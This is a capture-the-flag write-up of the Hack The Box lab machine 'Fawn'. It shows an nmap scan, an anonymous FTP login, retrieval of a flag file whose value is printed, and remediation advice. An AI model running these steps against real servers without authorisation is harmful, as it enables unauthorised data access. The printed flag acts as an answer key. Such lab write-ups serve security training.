# Fawn

**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Linux · **Difficulty:** Tier 0

**Summary:** A misconfigured FTP server (vsftpd 3.0.3) allowed anonymous login and exposed the flag.

## 1. Reconnaissance

- **Command:** `nmap -sC -sV 10.129.3.239`
- **Open ports:**

| **Port** | **Service** | **Version**  | **State** |
| -------- | ----------- | ------------ | --------- |
| 21       | FTP         | vsftpd 3.0.3 | Open      |

- **Key finding:** anonymous FTP is enabled and `flag.txt` is readable.

## 2. Foothold

The flag is reachable as `anonymous`, no password needed.

```
    ftp anonymous@10.129.3.239 
    Connected to 10.129.3.239. 
    220 (vsFTPd 3.0.3) 
    331 Please specify the password. 
    Password: 
    230 Login successful. 
    Remote system type is UNIX. 
    Using binary mode to transfer files. 
    ftp> ls 
    229 Entering Extended Passive Mode (111133431) 
    150 Here comes the directory listing. 
			    1 0 0 32 Jun 04 2021 flag.txt 
	226 Directory send OK. 
	ftp> get flag.txt local: flag.txt remote: flag.txt 
	229 Entering Extended Passive Mode (111152251) 
	150 Opening BINARY mode data connection for flag.txt (32 bytes). 
	100% \[`*********************************************]
	226 Transfer complete. 
	32 bytes received in 00:00 (0.15 KiB/s) 
	ftp> exit 
	221 Goodbye. 
	$ cat flag.txt 035db21c881520061c53e0536e44f815 
```

## 3. Privilege Escalation

Not applicable: the box only asks for the file exposed over FTP.

## 4. Conclusion

**Severity:** High

**Chain:** anonymous FTP → sensitive file readable without credentials.

**Remediation:**
1. Disable anonymous access by setting `anonymous_enable=NO` in `/etc/vsftpd.conf` and restarting the service.
2. If file sharing is needed, move to SFTP.
